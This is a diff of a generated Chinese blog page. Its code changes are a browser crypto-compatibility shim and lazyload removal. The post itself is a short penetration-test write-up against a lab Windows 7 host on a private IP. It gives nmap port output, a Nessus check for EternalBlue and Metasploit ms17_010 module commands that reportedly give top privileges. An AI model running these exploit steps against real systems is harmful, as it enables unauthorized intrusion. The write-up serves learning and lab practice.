@@ -9,7 +9,22 @@
     }
     </style>
 
-  
+  <script>
+    // 强制内网 IP 识别为安全上下文
+    if (window.location.hostname !== 'localhost' && window.location.protocol === 'http:') {
+        // 尝试手动映射 crypto 属性
+        if (!window.crypto.subtle && window.crypto.webkitSubtle) {
+            window.crypto.subtle = window.crypto.webkitSubtle;
+        }
+    }
+    
+    // 终极补丁：如果还是没有 subtle，则创建一个占位符避免报错
+    // 提示：这通常能解决加载报错，但如果插件强依赖原生加密，建议执行下面的“降级”预判
+    if (!window.isSecureContext) {
+        console.warn('当前环境非安全上下文，正在尝试兼容内网加密解密...');
+    }
+</script>
+
 
 <head>
   <meta charset="UTF-8">
@@ -61,7 +76,7 @@
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"192.168.126.129","root":"/","version":"1.8.7","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+    var CONFIG = {"hostname":"192.168.126.129","root":"/","version":"1.8.7","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
@@ -232,10 +247,10 @@
 <figure class="highlight nix"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nix"><span class="hljs-number">135</span><span class="hljs-symbol">/tcp</span>   open  msrpc        Microsoft Windows RPC<br><span class="hljs-number">139</span><span class="hljs-symbol">/tcp</span>   open  netbios-ssn  Microsoft Windows netbios-ssn<br><span class="hljs-number">445</span><span class="hljs-symbol">/tcp</span>   open  microsoft-ds Windows <span class="hljs-number">7</span> Professional <span class="hljs-number">7601</span> Service Pack <span class="hljs-number">1</span> microsoft-ds (<span class="hljs-params">workgroup:</span> WORKGROUP)<br><span class="hljs-number">49152</span><span class="hljs-symbol">/tcp</span> open  msrpc        Microsoft Windows RPC<br><span class="hljs-number">49153</span><span class="hljs-symbol">/tcp</span> open  msrpc        Microsoft Windows RPC<br><span class="hljs-number">49154</span><span class="hljs-symbol">/tcp</span> open  msrpc        Microsoft Windows RPC<br><span class="hljs-number">49155</span><span class="hljs-symbol">/tcp</span> open  msrpc        Microsoft Windows RPC<br><span class="hljs-number">49156</span><span class="hljs-symbol">/tcp</span> open  msrpc        Microsoft Windows RPC<br><span class="hljs-number">49157</span><span class="hljs-symbol">/tcp</span> open  msrpc        Microsoft Windows RPC<br><br></code></pre></div></td></tr></table></figure>
 <p>OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)</p>
 <p>139、445，很眼熟，于是用nessus扫描一下，是不是永恒之蓝等类似漏洞。</p>
-<p><img src="/2.PNG" srcset="/img/loading.gif"></p>
-<p><img src="/1.PNG" srcset="/img/loading.gif"></p>
+<p><img src="/2.PNG"></p>
+<p><img src="/1.PNG"></p>
 <figure class="highlight actionscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs actionscript"><span class="hljs-keyword">use</span> exploit/windows/smb/ms17_010_eternalblue 失败<br><span class="hljs-keyword">use</span> exploit/windows/smb/ms17_010<br>sysinfo<br>getuid<br></code></pre></div></td></tr></table></figure>
-<p><img src="/3.PNG" srcset="/img/loading.gif"><br>运行后直接是最高权限。</p>
+<p><img src="/3.PNG"><br>运行后直接是最高权限。</p>
 
             </div>
             <hr>
@@ -374,10 +389,6 @@
 
 <!-- Plugins -->
 
-
-  
-    <script  src="/js/lazyload.js" ></script>
-  
 
 
 
